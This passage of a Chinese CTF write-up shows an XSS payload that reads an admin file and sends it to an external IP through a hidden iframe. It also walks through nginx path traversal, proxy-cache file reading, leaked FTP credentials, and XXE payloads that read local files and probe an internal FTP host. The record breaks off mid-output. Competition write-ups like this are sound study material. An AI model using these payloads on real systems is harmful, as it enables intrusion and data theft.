class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.ajax(&#123;</span><br><span class=\"line\">    url: &quot;/admin/file&quot;,</span><br><span class=\"line\">    type: &quot;POST&quot;,</span><br><span class=\"line\">    data: &quot;filepasswd=HGf%5E%2639NsslUIf%5E23&quot;,</span><br><span class=\"line\">    dataType: &quot;text&quot;,</span><br><span class=\"line\">    success: function(result) &#123;</span><br><span class=\"line\">        var code = btoa(encodeURIComponent(result));</span><br><span class=\"line\">        xssPost(&apos;http://123.207.90.143&apos;, code);</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    error: function(msg) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">function xssPost(url, postStr) &#123;</span><br><span class=\"line\">    var de;</span><br><span class=\"line\">    de = document.body.appendChild(document.createElement(&apos;iframe&apos;));</span><br><span class=\"line\">    de.src = &apos;about:blank&apos;;</span><br><span class=\"line\">    de.height = 1;</span><br><span class=\"line\">    de.width = 1;</span><br><span class=\"line\">    de.contentDocument.write(&apos;&lt;form method=&quot;GET&quot; action=&quot;&apos; + url + &apos;&quot;&gt;&lt;input name=&quot;code&quot; value=&quot;&apos; + postStr + &apos;&quot;/&gt;&lt;/form&gt;&apos;);</span><br><span class=\"line\">    de.contentDocument.forms[0].submit();</span><br><span class=\"line\">    de.style.display = &apos;none&apos;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>得到flag:<code>sctf{T4is_is_f1ag2313}</code>。</p>\n</li>\n</ol>\n<h2 id=\"nginx的秘密\"><a href=\"#nginx的秘密\" class=\"headerlink\" title=\"nginx的秘密\"></a>nginx的秘密</h2><blockquote>\n<p>hint4:/editxxxxx怎么也能访问? </p>\n<p>hint3:路由嘛，扫一扫目录就知道了。views.py是读不出来的233333 </p>\n<p>hint2:这个路由好生奇怪 </p>\n<p>hint1:从nginx的典型错误配置入手吧 </p>\n</blockquote>\n<h3 id=\"目录穿越漏洞\"><a href=\"#目录穿越漏洞\" class=\"headerlink\" title=\"目录穿越漏洞\"></a>目录穿越漏洞</h3><blockquote>\n<p>-syc-note 我已经把所有秘密写进secret plan了233333 </p>\n</blockquote>\n<p>​ 需要读取secret plain</p>\n<p>首先可以发现nginx存在目录穿越漏洞，可以参考<a href=\"https://github.com/vulhub/vulhub/tree/master/nginx/insecure-configuration\" target=\"_blank\" rel=\"noopener\">https://github.com/vulhub/vulhub/tree/master/nginx/insecure-configuration</a>。</p>\n<p>访问<code>http://116.62.137.155:4455/static../etc/nginx/nginx.conf&gt;</code>，即可得到nginx.conf</p>\n<h3 id=\"理解proxy-cache-path\"><a href=\"#理解proxy-cache-path\" class=\"headerlink\" title=\"理解proxy_cache_path\"></a>理解proxy_cache_path</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">user www-data;</span><br><span class=\"line\">worker_processes auto;</span><br><span class=\"line\">pid /run/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">  worker_connections 768;</span><br><span class=\"line\">  # multi_accept on;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  ##</span><br><span class=\"line\">  # Basic Settings</span><br><span class=\"line\">  ##</span><br><span class=\"line\"></span><br><span class=\"line\">  sendfile on;</span><br><span class=\"line\">  tcp_nopush on;</span><br><span class=\"line\">  tcp_nodelay on;</span><br><span class=\"line\">  keepalive_timeout 65;</span><br><span class=\"line\">  types_hash_max_size 2048;</span><br><span class=\"line\">  # server_tokens off;</span><br><span class=\"line\"></span><br><span class=\"line\">  # server_names_hash_bucket_size 64;</span><br><span class=\"line\">  # server_name_in_redirect off;</span><br><span class=\"line\"></span><br><span class=\"line\">  include /etc/nginx/mime.types;</span><br><span class=\"line\">  default_type application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">  ##</span><br><span class=\"line\">  # SSL Settings</span><br><span class=\"line\">  ##</span><br><span class=\"line\"></span><br><span class=\"line\">  ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE</span><br><span class=\"line\">  ssl_prefer_server_ciphers on;</span><br><span class=\"line\"></span><br><span class=\"line\">  ##</span><br><span class=\"line\">  # Logging Settings</span><br><span class=\"line\">  ##</span><br><span class=\"line\"></span><br><span class=\"line\">  #access_log /var/log/nginx/access.log;</span><br><span class=\"line\">  #error_log /var/log/nginx/error.log;</span><br><span class=\"line\"></span><br><span class=\"line\">  ##</span><br><span class=\"line\">  # Gzip Settings</span><br><span class=\"line\">  ##</span><br><span class=\"line\"></span><br><span class=\"line\">  gzip on;</span><br><span class=\"line\">  gzip_disable &quot;msie6&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">  # gzip_vary on;</span><br><span class=\"line\">  # gzip_proxied any;</span><br><span class=\"line\">  # gzip_comp_level 6;</span><br><span class=\"line\">  # gzip_buffers 16 8k;</span><br><span class=\"line\">  # gzip_http_version 1.1;</span><br><span class=\"line\">  # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span><br><span class=\"line\"></span><br><span class=\"line\">  proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off;</span><br><span class=\"line\">  </span><br><span class=\"line\">  limit_conn_zone $binary_remote_addr zone=conn:10m;</span><br><span class=\"line\">  limit_req_zone  $binary_remote_addr zone=allips:10m rate=2r/s;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  server &#123;</span><br><span class=\"line\">      listen 4455 default_server;</span><br><span class=\"line\">      server_name localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">      location /static &#123;</span><br><span class=\"line\">          alias /home/;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      location ~* \\.(css|js|gif|png)&#123;</span><br><span class=\"line\">          proxy_cache             my_cache;</span><br><span class=\"line\">          proxy_cache_valid       200 30s;</span><br><span class=\"line\">          proxy_pass              http://bugweb.app:8000;</span><br><span class=\"line\">          proxy_set_header        Host $host:$server_port;</span><br><span class=\"line\">          proxy_ignore_headers    Expires Cache-Control Set-Cookie;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      location / &#123;</span><br><span class=\"line\">          limit_conn conn 10;</span><br><span class=\"line\">          proxy_pass       http://bugweb.app:8000;</span><br><span class=\"line\">          proxy_set_header Host $host:$server_port;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ##</span><br><span class=\"line\">  # Virtual Host Configs</span><br><span class=\"line\">  ##</span><br><span class=\"line\"></span><br><span class=\"line\">  include /etc/nginx/conf.d/*.conf;</span><br><span class=\"line\">  include /etc/nginx/sites-enabled/*;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#mail &#123;</span><br><span class=\"line\"># # See sample authentication script at:</span><br><span class=\"line\"># # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><br><span class=\"line\"># </span><br><span class=\"line\"># # auth_http localhost/auth.php;</span><br><span class=\"line\"># # pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;</span><br><span class=\"line\"># # imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;</span><br><span class=\"line\"># </span><br><span class=\"line\"># server &#123;</span><br><span class=\"line\">#   listen     localhost:110;</span><br><span class=\"line\">#   protocol   pop3;</span><br><span class=\"line\">#   proxy      on;</span><br><span class=\"line\"># &#125;</span><br><span class=\"line\"># </span><br><span class=\"line\"># server &#123;</span><br><span class=\"line\">#   listen     localhost:143;</span><br><span class=\"line\">#   protocol   imap;</span><br><span class=\"line\">#   proxy      on;</span><br><span class=\"line\"># &#125;</span><br><span class=\"line\">#&#125;</span><br></pre></td></tr></table></figure>\n<p>其中最重要的是这句话:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off;</span><br></pre></td></tr></table></figure>\n<p>匹配到~* .(css|js|gif|png)就进行缓存。</p>\n<p>查看文档<a href=\"http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_cache_path\" target=\"_blank\" rel=\"noopener\">http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_cache_path</a> 了解proxy_cache_path的值的含义，得知缓存文件保存在/tmp/mycache，用于定义缓存文件名的proxy_cache_key未设置，则使用默认值 \\$scheme\\$proxy_host\\$request_uri，即文件名形式为MD5(\\$scheme\\$proxy_host\\$request_uri),如果访问<a href=\"http://116.62.137.155:4455/write_plan/a.js/\" target=\"_blank\" rel=\"noopener\">http://116.62.137.155:4455/write_plan/a.js/</a> ，则缓存文件名为MD5(<a href=\"http://bugweb.app:8000/write_plan/a.js/\" target=\"_blank\" rel=\"noopener\">http://bugweb.app:8000/write_plan/a.js/</a>) ==6fcfa7b1e6bad837b70dc98c9b82b43b，由于proxy_cache_path设置了levels=1:2，因此缓存文件存在/tmp/mycache下的两级目录下，第一级目录名取MD5值的最后一个字符，第二级目录名取MD5值的倒数2、3个字符，例如/tmp/mycache/b/43/6fcfa7b1e6bad837b70dc98c9b82b43b，再通过任意文件读取即可读到缓存文件的内容。</p>\n<h3 id=\"读取secret-plain\"><a href=\"#读取secret-plain\" class=\"headerlink\" title=\"读取secret_plain\"></a>读取secret_plain</h3><p>由于路由很奇怪，访问/editxxxxx等同于访问/edit，同理访问/write_planxxxx等同于访问/write_planxxxx。因而构造<a href=\"http://116.62.137.155:4455/write_plan/a.js/\" target=\"_blank\" rel=\"noopener\">http://116.62.137.155:4455/write_plan/a.js/</a> 提交给管理员访问， 管理员在查看该页面之后，也就相当于访问了管理员的<code>http://116.62.137.155:4455/write_plan</code>,并生成了缓存文件，这时候再读取缓存文件。</p>\n<p><code>http://116.62.137.155:4455/static../tmp/mycache/b/43/6fcfa7b1e6bad837b70dc98c9b82b43b</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\u0003       嬹,[    m?[    ,R泻  ? \u000f\u0001                                                                                                      </span><br><span class=\"line\">KEY: http://bugweb.app:8000/write_plan/a.js/</span><br><span class=\"line\">HTTP/1.0 200 OK</span><br><span class=\"line\">Content-Type: text/html; charset=utf-8</span><br><span class=\"line\">Content-Length: 3555</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">  &lt;head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;title&gt;post bug&lt;/title&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class=\"line\">    &lt;!-- Bootstrap --&gt;</span><br><span class=\"line\">    &lt;link href=&quot;//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;link rel=&quot;shortcut icon&quot; href=&quot;/static/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;</span><br><span class=\"line\">&lt;link rel=&quot;icon&quot; href=&quot;/static/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;/head&gt;</span><br><span class=\"line\">  &lt;body&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;div class=&quot;navbar navbar-inverse&quot; role=&quot;navigation&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">        &lt;div class=&quot;navbar-header&quot;&gt;</span><br><span class=\"line\">            &lt;button type=&quot;button&quot; class=&quot;navbar-toggle&quot; data-toggle=&quot;collapse&quot; data-target=&quot;.navbar-collapse&quot;&gt;</span><br><span class=\"line\">                &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt;</span><br><span class=\"line\">                &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class=\"line\">                &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class=\"line\">                &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class=\"line\">            &lt;/button&gt;</span><br><span class=\"line\">            &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;Syc Work Notes&lt;/a&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">        &lt;div class=&quot;navbar-collapse collapse&quot;&gt;</span><br><span class=\"line\">            &lt;ul class=&quot;nav navbar-nav&quot;&gt;</span><br><span class=\"line\">                </span><br><span class=\"line\">          &lt;li&gt;&lt;a href=&quot;/user/admin&quot;&gt;UserInfo&lt;/a&gt;&lt;/li&gt;</span><br><span class=\"line\">          &lt;li&gt;&lt;a href=&quot;/edit/&quot;&gt;EditMyinfo&lt;/a&gt;&lt;/li&gt;</span><br><span class=\"line\">                    &lt;li&gt;&lt;a href=&quot;/write_plan/&quot;&gt;Write_your_plan&lt;/a&gt;&lt;/li&gt;</span><br><span class=\"line\">                    &lt;li&gt;&lt;a href=&quot;/import_and_export/&quot;&gt;import_and_export&lt;/a&gt;&lt;/li&gt;</span><br><span class=\"line\">          &lt;li&gt;&lt;a href=&quot;/post_bug/&quot;&gt;Post Bug&lt;/a&gt;&lt;/li&gt;</span><br><span class=\"line\">          &lt;li&gt;&lt;a href=&quot;/auth/logout?url=logout&quot;&gt;Sign Out&lt;/a&gt;&lt;/li&gt;</span><br><span class=\"line\">        </span><br><span class=\"line\">            &lt;/ul&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;div class=&quot;page-header&quot;&gt;</span><br><span class=\"line\">    &lt;h1&gt;Write down your secret plan. Rest assured that no one will see you.&lt;/h1&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;ul class=&quot;posts&quot;&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;form action=&quot;&quot; method=&quot;post&quot;</span><br><span class=\"line\">  class=&quot;form&quot; role=&quot;form&quot;&gt;</span><br><span class=\"line\">  &lt;input id=&quot;csrf_token&quot; name=&quot;csrf_token&quot; type=&quot;hidden&quot; value=&quot;Ijc3Mzk4MDMxYmI1NDUwMTA4NTZkOGEzYzhlZjAwZDMxOGZlMjNkMDQi.Dg6C7Q.1hRJWLxrI4d2tPRJMw5y3-WMtpE&quot;&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;form-group &quot;&gt;&lt;label class=&quot;control-label&quot; for=&quot;content&quot;&gt;Write your plan&lt;/label&gt;</span><br><span class=\"line\">        </span><br><span class=\"line\">          &lt;textarea class=&quot;form-control&quot; id=&quot;content&quot; name=&quot;content&quot;&gt;&lt;/textarea&gt;</span><br><span class=\"line\">        </span><br><span class=\"line\">  &lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;input class=&quot;btn btn-default&quot; id=&quot;submit&quot; name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">      &lt;li class=&quot;post&quot;&gt;</span><br><span class=\"line\">         &lt;div class=&quot;post-date&quot;&gt;</span><br><span class=\"line\">          &lt;span class=&quot;flask-moment&quot; data-timestamp=&quot;2018-05-17T07:46:36Z&quot; data-format=&quot;fromNow(0)&quot; data-refresh=&quot;0&quot; style=&quot;display: none&quot;&gt;2018-05-17T07:46:36Z&lt;/span&gt;</span><br><span class=\"line\">              鏄庢櫄缁村悓缃戞鐨刦tp鏈嶅姟鍣紝syc10ver Eec5TN9fruOOTp2G銆傚瘑鐮佽繖涔堥暱鐪熸槸闅捐锛屽娉ㄤ竴涓媬銆?        &lt;/div&gt;</span><br><span class=\"line\">      &lt;/li&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;/ul&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">    &lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/moment.js/2.18.1/moment-with-locales.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">moment.locale(&quot;en&quot;);</span><br><span class=\"line\">function flask_moment_render(elem) &#123;</span><br><span class=\"line\">    $(elem).text(eval(&apos;moment(&quot;&apos; + $(elem).data(&apos;timestamp&apos;) + &apos;&quot;).&apos; + $(elem).data(&apos;format&apos;) + &apos;;&apos;));</span><br><span class=\"line\">    $(elem).removeClass(&apos;flask-moment&apos;).show();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function flask_moment_render_all() &#123;</span><br><span class=\"line\">    $(&apos;.flask-moment&apos;).each(function() &#123;</span><br><span class=\"line\">        flask_moment_render(this);</span><br><span class=\"line\">        if ($(this).data(&apos;refresh&apos;)) &#123;</span><br><span class=\"line\">            (function(elem, interval) &#123; setInterval(function() &#123; flask_moment_render(elem) &#125;, interval); &#125;)(this, $(this).data(&apos;refresh&apos;));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$(document).ready(function() &#123;</span><br><span class=\"line\">    flask_moment_render_all();</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>从中我们可以得到ftp的账号密码:</p>\n<blockquote>\n<p>syc10ver         Eec5TN9fruOOTp2G</p>\n</blockquote>\n<h3 id=\"xxe-读取-proc-net-arp\"><a href=\"#xxe-读取-proc-net-arp\" class=\"headerlink\" title=\"xxe 读取/proc/net/arp\"></a>xxe 读取/proc/net/arp</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [</span><br><span class=\"line\">&lt;!ENTITY file SYSTEM &quot;file:///proc/net/arp&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;plans&gt;</span><br><span class=\"line\">    &lt;plan&gt;</span><br><span class=\"line\">        &lt;content&gt;&amp;file;&lt;/content&gt;</span><br><span class=\"line\">    &lt;/plan&gt;</span><br><span class=\"line\">&lt;/plans&gt;</span><br></pre></td></tr></table></figure>\n<p>结果如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">43 minutes ago 172.18.0.1 0x1 0x2 02:42:ca:cd:4e:eb * eth0</span><br><span class=\"line\">43 minutes ago</span><br><span class=\"line\">43 minutes ago 172.18.0.4 0x1 0x2 02:42:ac:12:00:04 * eth0</span><br><span class=\"line\">43 minutes ago</span><br><span class=\"line\">43 minutes ago 172.18.0.2 0x1 0x2 02:42:ac:12:00:02 * eth0</span><br></pre></td></tr></table></figure>\n<h3 id=\"xxe读取172-18-0-4-21的目录\"><a href=\"#xxe读取172-18-0-4-21的目录\" class=\"headerlink\" title=\"xxe读取172.18.0.4:21的目录\"></a>xxe读取172.18.0.4:21的目录</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE note [</span><br><span class=\"line\">&lt;!ENTITY file SYSTEM &quot;ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.4:21/&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;plans&gt;</span><br><span class=\"line\">    &lt;plan&gt;</span><br><span class=\"line\">        &lt;content&gt;&amp;file;&lt;/content&gt;</span><br><span class=\"line\">    &lt;/plan&gt;</span><br><span class=\"line\">&lt;/plans&gt;</span><br></pre></td></tr></table></figure>\n<p>结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2 minutes ago -rw-r--r-- 1 0 0 38 Jun 17 14:04 